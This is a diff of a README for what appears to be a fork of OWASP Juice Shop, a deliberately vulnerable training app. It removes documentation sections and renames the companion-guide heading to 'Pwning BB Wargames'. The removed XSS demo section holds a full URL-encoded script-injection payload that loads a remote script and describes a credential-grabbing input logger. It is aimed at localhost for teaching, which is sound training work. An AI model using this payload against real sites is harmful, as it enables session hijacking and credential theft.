@@ -19,68 +19,11 @@ Feel free to have a look at the latest version of OWASP Juice Shop:
 > supposed__ to use this instance for your own hacking endeavours! No
 > guaranteed uptime! Guaranteed stern looks if you break it!
 
-## Customization
-
-Via a YAML configuration file in `/config`, the OWASP Juice Shop can be
-customized in its content and look & feel.
-
-For detailed instructions and examples please refer to
-[our _Customization_ documentation](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/customization.html).
-
-## CTF-Extension
-
-If you want to run OWASP Juice Shop as a Capture-The-Flag event, we
-recommend you set it up along with a [CTFd](https://ctfd.io) server
-conveniently using the official
-[`juice-shop-ctf-cli`](https://www.npmjs.com/package/juice-shop-ctf-cli)
-tool.
-
-For step-by-step instructions and examples please refer to
-[the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
-of our companion guide ebook.
-
-## XSS Demo
-
-To show the possible impact of
-[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you
-can download this
-[docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
-and run `docker-compose up` to start the juice-shop and the
-shake-logger. Assume you received and (of course) clicked
-[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2Flocalhost:8080%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
-and login. Apart from the visual/audible effect, the attacker also
-installed [an input logger](http://localhost:8080/logger.php) to grab
-credentials! This could easily run on a 3rd party server in real life!
-
-> You can also find a recording of this attack in action on YouTube:
-> [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)
-
 
 ## Additional Documentation
 
-### Pwning OWASP Juice Shop [![Write Goodreads Review](https://img.shields.io/badge/goodreads-write%20review-382110.svg)](https://www.goodreads.com/review/edit/33834308)
+### Pwning BB Wargames 
 
-This is the official companion guide to the OWASP Juice Shop. It will
-give you a complete overview of the vulnerabilities found in the
-application including hints how to spot and exploit them. In the
-appendix you will even find complete step-by-step solutions to every
-challenge. [Pwning OWASP Juice Shop](https://leanpub.com/juice-shop) is
-published with
-[GitBook](https://www.gitbook.com/book/bkimminich/pwning-owasp-juice-shop)
-under
-[CC BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/)
-and is available **for free** in PDF, Kindle and ePub format. You can
-also
-[browse the full content online](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content)!
-
-[![Pwning OWASP Juice Shop Cover](https://raw.githubusercontent.com/bkimminich/pwning-juice-shop/master/cover_small.jpg)](https://leanpub.com/juice-shop)
-
-### Slide Decks
-
-* [Introduction Slide Deck](http://bkimminich.github.io/juice-shop) in
-  HTML5
-* [PDF of the Intro Slide Deck](http://de.slideshare.net/BjrnKimminich/juice-shop-an-intentionally-insecure-javascript-web-application)
-  on Slideshare
 
 ## Troubleshooting [![Gitter](http://img.shields.io/badge/gitter-join%20chat-1dce73.svg)](https://gitter.im/bkimminich/juice-shop)
 
